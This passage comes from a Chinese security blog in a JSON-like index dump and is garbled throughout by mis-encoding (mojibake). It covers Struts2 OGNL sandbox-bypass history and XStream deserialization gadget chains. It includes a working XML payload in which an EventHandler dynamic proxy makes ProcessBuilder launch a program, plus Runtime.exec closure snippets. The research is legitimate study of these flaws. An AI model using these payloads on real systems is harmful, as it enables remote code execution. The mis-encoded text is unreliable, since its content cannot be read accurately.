6Ë°åÊ∏ÖÈô§‰∫ÜexcludedÁõ∏ÂÖ≥ÁöÑÈõÜÂêàÔºå‰ΩÜÂÖ∂ÂΩìÂâçÁöÑËØ∑Ê±ÇÈªëÂêçÂçïËøòÊòØÂ≠òÂú®ÁöÑÔºåÊâÄ‰ª•Âú®2.5.xÁâàÊú¨Êàë‰ª¨ÈúÄË¶ÅÂèëÈÄÅ‰∏§Ê¨°Ëøô‰∏™pocÔºåÁ¨¨‰∏ÄÊ¨°Ê∏ÖÊ•öÈªëÂêçÂçïÔºåÁ¨¨‰∫åÊ¨°Ë¶ÜÁõñ_memberAccessÂπ∂Ë∞ÉÁî®ÈùôÊÄÅÂáΩÊï∞ 0x03 ÊÄªÁªì Âú®ÂàÜÊûêËøáÁ®ã‰∏≠ÔºåÂèÇËÄÉ‰∫ÜÂæàÂ§öÂ∏àÂÇÖ‰ª¨ÁöÑÁ¨îËÆ∞ÔºåËøôÈáåÁâπÂà´ÊÑüË∞¢‰∏Ä‰∏ãXD ‰ªéÊï¥‰∏™s2ÊºèÊ¥ûÁöÑÂéÜÁ®ãÊù•ÁúãÔºåËÉΩÁúãÂà∞ÂæàÂ§öÊºèÊ¥ûÂÖ∂ÂÆûÂà©Áî®ÁÇπÊòØÁõ∏‰ººÁöÑÔºåÂè™ÊòØËØ¥‰ªéÂì™‰∏™ÂÖ•Âè£ËøõÂéªÂèØËÉΩÊúâÊâÄ‰∏çÂêå„ÄÇËøôÁßçÊºèÊ¥ûÁöÑÂàÜÊûêÊàëËÆ§‰∏∫Áî®Êï∞ÊçÆÊµÅÂàÜÊûêÊòØÈùûÂ∏∏ÂêàÈÄÇÁöÑ„ÄÇlgtmÁöÑÂ∏àÂÇÖÂ∞±Áî®‰∫Ü‰ªñ‰ª¨ÁöÑcodeqlÂèëÁé∞‰∫ÜS2-057Ëøô‰∏™ÊºèÊ¥û„ÄÇ ‰ΩÜÊòØÂÆòÊñπÂú®‰∏ÄÊ¨°Ê¨°‰øÆÂ§ç‰∏≠ÔºåÂØπ‰∫éognlË°®ËææÂºèÁöÑÊâßË°åÈôêÂà∂ÁöÑË∂äÊù•Ë∂äÂ§öÔºå‰ΩøÂæóÂ¶Ç‰ªäÂ∞±ÁÆóÂá∫Áé∞ognlË°®ËææÂºèÊ≥®ÂÖ•‰πüÂæàÈöæÈÄ†ÊàêRCEÁöÑÊïàÊûú„ÄÇ ËøôÈáåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÁúãlucifaerÂ∏àÂÇÖÁöÑÈÇ£ÁØáÊñáÁ´† ‰ªéÊó∂Èó¥Á∫øÊù•ÁúãÔºå struts2 2.3.14.1‰πãÂâçÔºåognlË°®ËææÂºèÊâßË°åÊ≤°Êúâ‰ªÄ‰πàÈöúÁ¢çÔºõ2.3.14.1Â¢ûÂä†‰∫ÜSecurityMemberAccessÔºåÁ¶ÅÊ≠¢ÈùôÊÄÅÂáΩÊï∞ÊâßË°åallowStaticMethodAccess=falseÔºåÂú®ognlË°®ËææÂºèÈáåÈù¢ÂèØ‰ª•ÈáçÊñ∞ÁΩÆ‰∏∫trueÔºõÂêéÁª≠Ëøô‰∏™ÂÄºË¢´ÊîπÊàê‰∫ÜfinalÔºåÊó†Ê≥ïË¢´Êõ¥Êîπ struts2 2.3.20‰πãÂâçÔºåËôΩÁÑ∂‰∏çËÉΩÊîπallowStaticMethodAccessÔºå‰ΩÜÊòØÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†ÂáΩÊï∞ÁöÑÊñπÂºèÁªïËøáÔºõ2.3.20‰πãÂêéÔºåÂ¢ûÂä†‰∫ÜÈªëÂêçÂçï struts2 2.3.29‰πãÂâçÔºåÈÄöËøá`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`ËøôÁßçÊñπÂºèÂàùÂßãÂåñÔºåÊ∏ÖÁ©∫ÈªëÂêçÂçïÔºõ2.3.29‰πãÂêéÔºåÊñ∞Â¢û‰∫ÜÈªëÂêçÂçïÔºåÈôêÂà∂‰∫ÜËøôÁßçÊñπÂºèÁöÑÊâßË°å struts2 2.3.34/2.5.16‰πãÂâçÔºåÈÄöËøácontainerÂÆû‰æãÂåñognlUtilÔºåÊ∏ÖÁ©∫ÈªëÂêçÂçïÔºåËØ¶ÁªÜËßÅS2-045Ôºõ‰πãÂêéÁ¶ÅÊ≠¢‰∫Ücontext.mapÁöÑËÆøÈóÆÂíåexcludedClasses‰∏çÂèØÂèòÔºå‰∏çËÉΩÈÄöËøáclearÊ∏ÖÊ•ö struts2 2.5.17‰πãÂâçÔºåÈÄöËøárequest‰∏≠Ëé∑ÂèñcontextÔºåÁªïËøácontext.mapÁ¶ÅÊ≠¢ËÆøÈóÆÁöÑÈôêÂà∂ÔºåËØ¶ÁªÜËßÅS2-057Ôºõ‰πãÂêéÊñ∞Â¢û‰∫ÜÈªëÂêçÂçïÔºåÂÆåÂÖ®Á¶ÅÊ≠¢ÈÄöËøáognlÁöÑÂåÖÊù•ÂØπstackÂÅöÊìç‰Ωú ÂêéÁª≠Âá†‰∏™ÁâàÊú¨‰πüÊõ¥Êñ∞‰∫ÜÂæàÂ§öÂÆâÂÖ®Êé™ÊñΩÔºåÂÖ∑‰ΩìËßÅlucifaerÂ∏àÂÇÖÁöÑÊñáÁ´† Âú®ÂàÜÊûêÂÆåstruts2‰πãÂêéÔºå‰πüÊîπÂèò‰∫ÜÂØπÂæàÊúâÂêçÁöÑÊºèÊ¥ûÁöÑÊÑüÂÆòÔºå‰ª•ÂâçÊÄªËßâÂæóstrutsÊºèÊ¥ûÈÉΩÊòØÊØîËæÉÂ§çÊùÇÁöÑÔºå‰ΩÜÊòØÁé∞Âú®ÊÉ≥ÊÉ≥ÊúâÁ≤æÂΩ©Â§çÊùÇÁöÑÂú∞Êñπ‰πü‰ºöÊúâÂæàÂÇªÁöÑÂú∞Êñπ„ÄÇ ‰∏çËÉΩÂØπËøòÊ≤°ÊúâÂàÜÊûêËøáÁöÑÊ°ÜÊû∂ÊàñËÄÖÂ∫îÁî®ÊåÅÊúâÁïèÊÉß‰πãÂøÉÔºåÂÖ±ÂãâXD"},{"title":"„Äênotes„ÄëÂõûÈ°æXStreamÂèçÂ∫èÂàóÂåñÊºèÊ¥û","permalink":"http://blog.0kami.cn/2020/04/18/java/talk-about-xstream-deserialization/","text":"0x00 ÂâçË®Ä XStream‰πüÊòØ‰∏ÄÊ¨æÁî®ÁöÑÊØîËæÉÂ§öÁöÑÂ∫èÂàóÂåñÁªÑ‰ª∂ÔºåÂèØ‰ª•Â∞ÜobjectËΩ¨Âåñ‰∏∫XMLÂπ∂ËÉΩÂÆåÊï¥ÁöÑËøòÂéüÂõûÊù•„ÄÇ‰ªñ‰πüÊõæÁªèÂá∫Áé∞ËøáÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÊú¨Êñá‰∏ªË¶ÅÊï¥ÁêÜXStreamÁõ∏ÂÖ≥ÁöÑÂÆâÂÖ®ÈóÆÈ¢òXD 0x01 Âü∫Á°ÄÁü•ËØÜ XStreamÁöÑÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ‰∏ªË¶Å‰æùÈù†toXMLÂáΩÊï∞ÂíåfromXMLÂáΩÊï∞ÔºåÂ¶Ç‰∏ã‰ª£Á†ÅÊâÄÁ§∫ 1234567891011Person person = new Person(\"tom\", 18);XStream xStream = new XStream();String xml = xStream.toXML(person);// object to xmlSystem.out.println(xml);System.out.println(xStream.fromXML(xml)); // xml to object// ËæìÂá∫// &lt;objects.Person&gt;// &lt;name&gt;tom&lt;/name&gt;// &lt;age&gt;18&lt;/age&gt;// &lt;/objects.Person&gt;// objects.Person@369f73a2 ÂÖ≥‰∫éXStreamÁöÑfromXMLÂàÜÊûêÁúãËøôÁØáÊñáÁ´†ÔºåXStream‰ºöÂéªË∞ÉÁî®‰∏çÂêåÁöÑConvertersÊù•Â§ÑÁêÜËøòÂéüÁöÑËøáÁ®ã„ÄÇ XStreamÂèçÂ∫èÂàóÂåñÂêåfastjsonËøôÁßç‰∏ç‰∏ÄÊ†∑ÁöÑÂú∞ÊñπÊòØfastjson‰ºöÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄô‰∏ªÂä®ÂéªË∞ÉÁî®gettersÂíåsettersÔºåËÄåXStreamÁöÑÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠ËµãÂÄºÈÉΩÊúâJavaÁöÑÂèçÂ∞ÑÊú∫Âà∂Êù•ÂÆåÊàêÔºåÊâÄ‰ª•Âπ∂Ê≤°ÊúâËøôÊ†∑‰∏ªÂä®Ë∞ÉÁî®ÁöÑÁâπÊÄß„ÄÇ ‰ΩÜÊòØËøòÊúâ‰∏ÄÁßçÂà©Áî®ÊñπÂºèÔºåÂõûÊÉ≥‰∏Ä‰∏ãÔºåÂú®Âá†Êù°Â∏∏ËßÑÁöÑjavaÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ‰∏äÔºåÈÉΩÂà©Áî®‰∫ÜHashMap„ÄÅPriorityQueueÁ≠âÂØπË±°Ôºàkey‰∏çÂèØÈáçÂ§çÁ≠âÁâπÊÄßÔºâ‰ºöËá™Âä®ÂéªË∞ÉÁî®hashCode„ÄÅequal„ÄÅcompareToÁ≠âËøôÁßçÂáΩÊï∞„ÄÇ ‰ª•ËøôÁßçÊÉ≥Ê≥ïÊù•ÁúãXStreamÂèçÂ∫èÂàóÂåñÔºåÂΩìÊàë‰ª¨ÂØπMapËøôÁßçÁ±ªÂûãÁöÑÂØπË±°ËøõË°åËøòÂéüÁöÑÊó∂ÂÄôÔºåÊòØÂê¶‰πüÂêåÊ†∑‰ºöÂéªË∞ÉÁî®‰∏äÈù¢ÊèêÂà∞ÁöÑÂá†ÁßçÂáΩÊï∞ÔºüÊé•‰∏ãÊù•ÔºåÁúãÂá†‰∏™ConverterÁöÑÂ§ÑÁêÜÔºö 1. MapConverterÊù•ÁúãÁúãÈíàÂØπMapÁ±ªÂûãËøòÂéüÁöÑConverter com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal populateMapÂáΩÊï∞‰ºöÂéªÂ§ÑÁêÜÂêéÁª≠ÁöÑÂÄºÔºåËøôÈáåÊàë‰ª¨Áõ¥Êé•Êù•ÁúãÂÖ∑‰ΩìputÁöÑÂú∞Êñπ com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap ËøôÈáåtarget‰Ωú‰∏∫Êé•Êî∂ËÄÖÔºå‰ºöË∞ÉÁî®MapÁöÑputÂáΩÊï∞ÔºåÂêéÁª≠Â∞±ÊòØÊàë‰ª¨ÁÜüÊÇâÁöÑÂØπkeyË∞ÉÁî®hashCodeÂáΩÊï∞ 2. TreeSet/TreeMapConverterËøôÈáåTreeSetÂíåTreeMap‰∏ÄËµ∑ËÆ≤ÔºåÂõ†‰∏∫TreeSetÊú¨Ë∫´Â∞±ÊòØ‰∏Ä‰∏™Âè™Áî®‰∏ä‰∫ÜKeyÁöÑTreeMapÔºõTreeSetConverterÁöÑÂèçÂ∫èÂàóÂåñÂ§ÑÁêÜ‰πüÊòØÂÖàËΩ¨Âåñ‰∏∫TreeMapConverterÁöÑÊñπÂºèÊù•‰ºòÂÖàËøòÂéüTreeSetÈáåÁöÑTreeMapÔºåÂÜçÂ°´ÂÖÖÂà∞TreeSetÈáå„ÄÇ ‰ªéTreeSetConverterÊù•ËÆ≤ ‰ªétreeset‰∏≠ÂèñÂá∫field treemapÂêéÔºåÂéªËøõ‰∏ÄÊ≠•Ë∞ÉÁî®TreeMapConverterÊù•ËøòÂéüTreeMap com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap ËøôÈáåÂÖàÁî®soredMapÊù•Â°´ÂÖÖÈúÄË¶ÅËøòÂéüÁöÑEntryÔºåÂêéÁª≠Â∞ÜË∞ÉÁî®TreeMap.putAll ÊúÄÁªà‰ºöË∞ÉÁî®Âà∞java.util.AbstractMap#putAll ËøôÈáåÁöÑputÂáΩÊï∞‰∏∫TreeMap.put,‰∏çÁúãÂÖ∑‰ΩìÁöÑ‰ª£Á†Å‰∫ÜÔºå‰ªñÁöÑ‰∏ªË¶ÅÂäüËÉΩÂ∞±ÊòØÂ°´ÂÖÖÊï∞ÊçÆÔºåÂπ∂‰∏îÂú®Â°´ÂÖÖÊó∂Â∞Ü‰ºöÊØîËæÉÂΩìÂâçÂ≠òÂú®keyÔºåÂ¶ÇÊûúÊòØÁõ∏ÂêåÁöÑkeyÔºåÂàôÊõøÊç¢ÂéüÊúâËÄÅÁöÑÂÄº„ÄÇËøô‰∏™ËøáÁ®ã‰ºöÂéªË∞ÉÁî®keyÁöÑcompareToÂáΩÊï∞ 3. DynamicProxyConverterËøòÈúÄË¶ÅÊèêÂèäÁöÑÊòØXStreamËøòÊîØÊåÅÂØπÂä®ÊÄÅ‰ª£ÁêÜÁöÑÊñπÂºèËøõË°åËøòÂéü ËøôÈáåÁöÑËøòÂéüËøáÁ®ã‰∏çËØ¥‰∫ÜÔºåÊàë‰ª¨‰∏ªË¶ÅÁöÑÂÖ≥Ê≥®ÁÇπÊòØ‰ΩøÁî®ProxyÂä®ÊÄÅ‰ª£ÁêÜÔºåÊàë‰ª¨ÂèØ‰ª•Êâ©Â±ïÂâçÈù¢‰∏§ÁßçÁöÑËá™Âä®Ë∞ÉÁî®ÂáΩÊï∞ÁöÑÊîªÂáªÈù¢Ôºå‰∏ã‰∏ÄÁ´†‰ºö‰∏æEventHandlerÁöÑ‰æãÂ≠ê 0x02 Áé∞ÊúâÂá†ÁßçÂà©Áî®ÂàÜÊûêÁªìÂêà‰∏äÈù¢Âü∫Á°ÄÁü•ËØÜ‰∏≠ÊèêÂà∞ÁöÑÂá†‰∏™ConverterÔºåÊàë‰ª¨ÊÉ≥Ë¶ÅÂà©Áî®XStreamÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑËØùÔºåÂæóÂéªÂÖÖÂàÜÂà©Áî®ÂâçÈù¢ÊèêÂà∞ÁöÑÂá†‰∏™‰ºöËá™Âä®Ë∞ÉÁî®ÁöÑÂáΩÊï∞ 1. EventHandlerXStreamÂèçÂ∫èÂàóÂåñÁî®ÁöÑÊúÄÂ§öÁöÑEventHandlerÔºåÊù•ÁúãÁúã‰ªñÁöÑinvokeÂáΩÊï∞ ‰∏ªË¶ÅÂÆûÁé∞Âú®invokeInternalÂáΩÊï∞ÂÜÖ È¶ñÂÖàÈúÄË¶ÅÂà§Êñ≠Ê≠§Êó∂Ë∞ÉÁî®ÁöÑÂáΩÊï∞ÊòØÂê¶‰∏∫hashCode„ÄÅequals„ÄÅtoStringÔºåÂ¶ÇÊûúÊòØÁöÑËØùÔºåÈááÁî®‰ª•‰∏ãÁöÑÊñπÂºèÊù•Â§ÑÁêÜ„ÄÇ ‰ΩÜÊòØÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®ÁöÑÊòØinvokeInternalÂáΩÊï∞ÂêéÁª≠ÁöÑÈÉ®ÂàÜÔºåÊâÄ‰ª•Êàë‰ª¨Âà©Áî®ÁöÑÊó∂ÂÄô‰∏çËÉΩÁî®ÂÆÉÊù•Ë∞ÉÁî®‰∏äÈù¢ÁöÑ3‰∏™ÂáΩÊï∞ÔºåÊÑèÂë≥ÁùÄÊàëÂâçÈù¢ÊèêÂà∞ÁöÑMapÁöÑÊñπÂºèÔºå‰∏çÈÄÇÂêàÁî®Âú®Ëøô‰∏™Âú∞ÊñπÔºõËÄåTreeSetËøôÁßçË∞ÉÁî®compareToÂáΩÊï∞ÔºåÂèØ‰ª•Áî®Êù•ÁªßÁª≠ÂæÄ‰∏ãËµ∞„ÄÇ ÁªßÁª≠ÂæÄ‰∏ãÁúã ÂêéÁª≠ÁöÑÂ∞±ÊòØÁªèÂÖ∏ÁöÑjavaÂèçÂ∞ÑÊú∫Âà∂Êù•ÂÆûÁé∞ÂáΩÊï∞Ë∞ÉÁî®ÔºåÂπ∂‰∏îËøôÈáåÁöÑtargetÂíåactionÈÉΩÊòØÂèØÊéßÁöÑ„ÄÇ ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑè‰∏Ä‰∏™ÈóÆÈ¢òÊòØÔºåËøôÈáåactionÂáΩÊï∞ÂèÇÊï∞ÊòØÊúâË¶ÅÊ±ÇÁöÑÔºàÁúã452Ë°åÂà∞461Ë°åÔºâ Êó†ÂèÇÊï∞ Âçï‰∏™ÂèÇÊï∞Ôºå‰∏îÂèÇÊï∞ÁöÑÁ±ªÂûã‰∏∫ComparableÔºåÂπ∂‰∏îËøô‰∏™actionÂáΩÊï∞ÊòØÂèØÂà©Áî®ÁöÑ Á¨¨2ÁßçËøòÊ≤°ÊúâÊâæÂà∞ËøôÊ†∑ÂèØÂà©Áî®ÁöÑÂáΩÊï∞ÔºåËøôÈáåÁöÑÁ¨¨‰∏ÄÁßçÂèØ‰ª•Êèê‰∏§ÁßçÔºö ÈÖçÁΩÆÂ•ΩcmdÁöÑProcessBuilderÔºåactionÂ°´start ÈÖçÁΩÆÂ•Ωrmi urlÁöÑJdbcRowSetImplÔºåactionÂ°´getDatabaseMetaDataÔºåËøôÈáåÂèØ‰ª•‰∏æ‰∏ÄÂèç‰∏âÔºå‰∏ªË¶ÅÊÄùË∑ØÂ∞±ÊòØÂèØÂà©Áî®ÁöÑgetters Áé∞Âú®ÂÜçÊù•ÁúãÁúãÂÖ∑‰ΩìÁöÑPOC 123456789101112131415&lt;sorted-set&gt; &lt;string&gt;foo&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;!-- Proxy Âä®ÊÄÅ‰ª£ÁêÜÔºåhandler‰ΩøÁî®EventHandler --&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 2. Groovy ConvertedClosureÂà©Áî®Êù°‰ª∂Ôºögroovy &lt;= 2.4.3ÔºåÂú®ÂêéÁª≠ÁöÑÁâàÊú¨ÈáåÔºåMethodClosure‰∏çÂÖÅËÆ∏ÂèçÂ∫èÂàóÂåñË∞ÉÁî®„ÄÇ Èô§‰∫Ü‰∏äÈù¢ËøôÁßçEventHandlerÁöÑÂä®ÊÄÅ‰ª£ÁêÜÊñπÂºèÔºåGroovyÁöÑConvertedClosure‰πüÂêåÊ†∑ÂèØ‰ª•ËææÂà∞ËøôÁßçÊïàÊûú MethodClosureÂΩìÂâçMethodClosureÁöÑ‰∏ªË¶Å‰ΩúÁî®Â∞±ÊòØÂ∞ÅË£ÖÊàë‰ª¨ÈúÄË¶ÅÊâßË°åÁöÑÂØπË±°ÔºåÊØîÂ¶Ç 1new MethodClosure(Runtime.getRuntime(), \"exec\"); Â∞ÅË£ÖRuntimeÂØπË±°ÔºåÂπ∂ËÆæÂÆöÂêéÁª≠ÈúÄË¶ÅË∞ÉÁî®ÁöÑÂáΩÊï∞exec ConvertedClosureËøô‰∏™ConvertedClosure‰πüÊòØÁªßÊâø‰∫ÜInvocationHandlerÔºåÂèØ‰ª•Âú®Âä®ÊÄÅ‰ª£ÁêÜ‰∏≠‰Ωú‰∏∫handlerÁöÑÂ≠òÂú®ÔºåÊù•Áúã‰∏Ä‰∏ã‰ªñÁöÑinvoke ConvertedClosureË∞ÉÁî®ÁöÑÊòØÁà∂Á±ªorg.codehaus.groovy.runtime.ConversionHandler#invoke ‰∏ªË¶ÅÁúãËøô‰∏™ÈÉ®ÂàÜÔºåÂØπ‰∫éÂΩìÂâçË∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåÂ¶ÇÊûúÈùûObjectÁöÑÂáΩÊï∞(Â¶ÇtoString„ÄÅhashCodeÁ≠â)ÔºåÂπ∂‰∏î‰∏çÊòØGroovyObjectÁöÑÂáΩÊï∞Ôºå‰ºöÂéªË∞ÉÁî®Â≠êÁ±ªÁöÑinvokeCustomÔºåËøôÈáåÁúãorg.codehaus.groovy.runtime.ConvertedClosure#invokeCustom ËøôÈáåÁöÑÂ±ûÊÄßÈÉΩÊòØÂèØÊéßÁöÑÔºå‰πüÂ∞±ÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•ÂéªË∞ÉÁî®ÂéªË∞ÉÁî®ÂâçÈù¢ÊûÑÈÄ†Â•ΩÁöÑMethodClosureÔºåËøôÈáåÂêéÁª≠Ë∞ÉÁî®callÁöÑËøáÁ®ãÂèØ‰ª•ÁúãÊúÄËøëÁöÑËøôÁØáÊñáÁ´† ÊâÄ‰ª•‰∏∫‰∫ÜÊª°Ë∂≥ËÉΩË∞ÉÁî®invokeCustomÂáΩÊï∞ÔºåÂâçÈù¢ÁöÑ‰∏§ÁßçMapConverterÂíåTreeSetConverterÔºåÈÄâÂì™ÁßçÂë¢Ôºü ÂæàÊòéÊòæÁ≠îÊ°àÊòØÈÄâÊã©TreeSetConverterÔºåÂõ†‰∏∫Map‰ºöÂéªË∞ÉÁî®hashCodeÔºåËÄåTreeSet‰ºöÂéªË∞ÉÁî®compareToÔºåËøôÈáåÁöÑhashCodeÊòØObjectÁöÑÂáΩÊï∞ÔºåËøá‰∏ç‰∫Ü‰∏äÈù¢checkMethodÔºåÂÖ∑‰ΩìÊÄé‰πàÂÜôPOCÔºå‰∏çËØ¶ÁªÜËØ¥‰∫ÜÔºåËßÅysomap PSÔºöËøôÈáåÈúÄË¶ÅÊèê‰∏Ä‰∏ãÁöÑÊòØÁî±‰∫écompareTo‰ºöÂ∏¶‰∏ä‰∏Ä‰∏™ÂèÇÊï∞ÔºåÊâÄ‰ª•Êàë‰ª¨MethodClosureÂ∞ÅË£ÖÁöÑÂêéÁª≠ÈúÄË¶ÅË∞ÉÁî®ÁöÑÂáΩÊï∞ÂøÖÈ°ªË¶ÅÂ≠òÂú®‰∏Ä‰∏™StringÁ±ªÂûãÁöÑÂèÇÊï∞Ôºå‰∏çÁÑ∂‰ºöÊâæ‰∏çÂà∞ÂáΩÊï∞Êä•Èîô„ÄÇÔºàÂèØËÉΩËøòÊúâÂÖ∂‰ªñÁöÑËß£ÂÜ≥ÊñπÊ≥ïÔºåËøôÈáåÊàëÊ≤°ÁªßÁª≠Ê∑±ÂÖ•‰∏ãÂéª‰∫ÜÔºåÁõ¥Êé•ÊûÑÈÄ†Runtime.execÂèØ‰ª•Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºâ 3. Groovy ExpandoÂâçÈù¢Áî®Âà∞‰∫ÜTreeSetÁöÑÊñπÂºèÔºåËøôÈáåÊàë‰ª¨Âéª‰ΩøÁî®MapÁöÑÁ±ªÂûãÊù•Ëß¶Âèë„ÄÇ‰ª•MapÁöÑÁ±ªÂûãÊù•Ëß¶ÂèëÔºåÈÇ£Â∞±ÊòØÊâæÂèØ‰ª•Âà©Áî®ÁöÑhashCodeÂáΩÊï∞ groovy.util.Expando#hashCode Â¶ÇÊûúÂú®Á±ªÂ±ûÊÄßexpandoProperties‰∏≠Â≠òÂú®hashCode:methodclosureÁöÑÂÜÖÂÆπÔºåÊàë‰ª¨ÂèØ‰ª•Âú®ËøôÈáåÁõ¥Êé•Ë∞ÉÁî®MethodClosureÁöÑcallÂáΩÊï∞ÔºåË∑ü‰∏äÈù¢ConvertedClosureÂêéÁª≠ÁöÑË∞ÉÁî®‰∏ÄÊ†∑Ôºå‰ΩÜÊòØËøôÈáåË∞ÉÁî®Êó∂Ê≤°ÊúâÂáΩÊï∞ÂèÇÊï∞ËøáÊù•ÔºåÊâÄ‰ª•ËøôÈáåÁöÑÊÄùË∑ØÊòØProcessBuilder.startÊàñËÄÖfastjsonÈÇ£ÁßçgettersÁöÑÂà©Áî®ÔºåËßÅPOC 4. ImageIO$ContainsFilter‰∏äÈù¢‰ΩøÁî®Âä®ÊÄÅ‰ª£ÁêÜÁöÑÊñπÂºèÂà©Áî®‰∫ÜTreeSetË∞ÉÁî®putÊó∂Ëß¶ÂèëÁöÑcompareToÔºåËÄåËøôÈáåÂà©Áî®ÁöÑÊòØHashMapÁ±ªÂûãputÊó∂Ë∞ÉÁî®ÁöÑhashCodeÂáΩÊï∞ÔºõËøô‰∏™ÈìæÁõ∏ÂØπÊù•ËØ¥Â§çÊùÇ‰∏ÄÁÇπÔºåÊàë‰ª¨‰∏ÄÁÇπ‰∏ÄÁÇπÊù•ËØ¥ÔºàÂèÇËÄÉmarshalsecÁöÑImageIOÔºåËøôÈáåÂÖàËÜú‰∏ÄÊ≥¢Â§ß‰Ω¨ÁöÑÊÄùË∑ØÔºåÂêéÊñá‰∏∫È°∫ÂäøËÆ≤‰∏ãÂéªÁöÑÔºå‰∏ªË¶ÅÁõÆÁöÑÊòØÂà∞ËææIterator.nextÔºåÂÆûÈôÖÊåñÊéòËøôÁßçÈìæËøòÊòØÂæó‰ªéÂêéÂæÄÂâçÊâæÔºâÔºö ‰ªéXStreamÂ§ÑÁêÜMapÁ±ªÂûãÊó∂Ëß¶ÂèëhashCodeÂºÄÂßã ÂÖ≥Ê≥®jdk.nashorn.internal.objects.NativeString#hashCode ÂêéÁª≠Ë∞ÉÁî®getStringValueÂáΩÊï∞ÔºåÂú®Ëøô‰∏™ÂáΩÊï∞ÈáåÂéªË∞ÉÁî®‰∫Üthis.value.toString()ÔºåËøôÈáåÁöÑvalueÁöÑÁ±ªÂûã‰∏∫CharSequenceÔºåÊâÄ‰ª•Êàë‰ª¨Êé•‰∏ãÊù•Ë¶ÅÊâæÂèØ‰ª•Âà©Áî®ÁöÑCharSequenceÁöÑÂÆûÁé∞Á±ªÔºåËøôÈáåÁî®Âà∞ÁöÑÊòØcom.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toStringÂáΩÊï∞ ËøôÈáåÁ¥ßÊé•ÁùÄ‰ºöÂéªË∞ÉÁî®ByteArrayOutputStreamExÁöÑreadFromÔºåËøô‰∏™ÂáΩÊï∞Áî®Âà∞ÁöÑ‰∏ªË¶ÅÊòØËøôËæπ‰º†ÂÖ•ÁöÑInputStreamÁöÑreadÂáΩÊï∞ ÂÆûÈôÖ‰∏äisÊàë‰ª¨ÊòØÂèØ‰ª•ÊéßÂà∂ÁöÑÔºåÂõ†‰∏∫ËøôÈáåË∞ÉÁî®ÁöÑthis.dataHandler.getDataSource().getInputStream()Ôºå‰ªñÁöÑÂÄº‰º†ÈÄíÈÉΩÂèØ‰ª•Áî®Á±ªÂ±ûÊÄßÁöÑÊñπÂºèÊää‰ªñÊûÑÂª∫Âá∫Êù•ÔºåÂàÜÂà´ÊòØ 123451. this.dataHandler == ÊûÑÈÄ†Â•ΩÁöÑDataHandler2. DataHandlerÁöÑdataSourceÂ±ûÊÄß == ÊûÑÈÄ†Â•ΩÁöÑXmlDataSource3. XmlDataSourceË∞ÉÁî®getInputStream()ÂáΩÊï∞ËøîÂõûÊûÑÈÄ†Â•ΩÁöÑinputStream// com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource Áî®ËøôÁßçÊñπÊ≥ïÂ∞±ÂèØ‰ª•Ëé∑Âèñ‰∏Ä‰∏™ÂèØÊéßÁöÑinputStreamÔºåÂπ∂‰∏îÂêéÁª≠‰ºöÂéªË∞ÉÁî®readÂáΩÊï∞ ÁªßÁª≠Áúã‰∏ãÂéªÔºåjavax.crypto.CipherInputStream#read Ê≠§Êó∂ÈúÄË¶ÅÊûÑÈÄ†‰∏Ä‰∏™CipherÁ±ªÂûãÔºåÂπ∂‰∏îÂêéÁª≠Ë∞ÉÁî®Cipher.updateÂáΩÊï∞ÔºåËøôÈáåÂèØ‰ª•Áî®javax.crypto.NullCipherÊù•Â°´ÂÖÖÔºåÂõ†‰∏∫ÊúÄÁªàÁî®Âà∞ÁöÑÊòØÁà∂Á±ªCipher.updateÔºåÂè™Ë¶Å‰∏çÈáçËΩΩupdateÔºåÂÖ∂‰ªñÁöÑÂ≠êÁ±ª‰πüÂèØ‰ª•„ÄÇ ÁªßÁª≠ÁúãCipher.update ËØ¥‰∫ÜÈÇ£‰πà‰πÖÔºåÊàë‰ª¨Áªà‰∫éÂà∞‰∫ÜËá≥ÂÖ≥ÈáçË¶ÅÁöÑ‰∏Ä‰∏™Âú∞ÊñπÔºåserviceIterator.nextÂáΩÊï∞ ÂêéÁª≠Êàë‰ª¨Â∞ÜË∞ÉÁî®ImageIO‰∏ãÁöÑjavax.imageio.spi.FilterIterator#next advanceÂáΩÊï∞‰ºöÂéªË∞ÉÁî®filter.filterÂáΩÊï∞ÔºåËÄåImageIOÂ≠òÂú®‰∏Ä‰∏™ÊúâË∂£ÁöÑfilter javax.imageio.ImageIO.ContainsFilter#filter Êàë‰ª¨ÂèØ‰ª•ÊåáÂÆö‰∏Ä‰∏™MethodÂØπË±°ÂéªinvokeÔºåÂà∞‰∫ÜËøôÈáåÂ∞±ÊòØÊøÄÂä®‰∫∫ÂøÉÁöÑJavaÂèçÂ∞ÑÊú∫Âà∂‰∫ÜÔºåÊàë‰ª¨ÊèêÂâçÊûÑÈÄ†Â•ΩmethodÂØπË±°ÔºåÂ∞±ÂèØ‰ª•Ë∞ÉÁî®‰ªªÊÑèÁöÑÂáΩÊï∞„ÄÇ Âà©Áî®ÈìæÊØîËæÉÈïøÔºåÊï¥ÁêÜ‰∏Ä‰∏ãËøáÁ®ã 123456789XStream Â§ÑÁêÜMapÁ±ªÂûã ÂéªË∞ÉÁî®jdk.nashorn.internal.objects.NativeString#hashCode 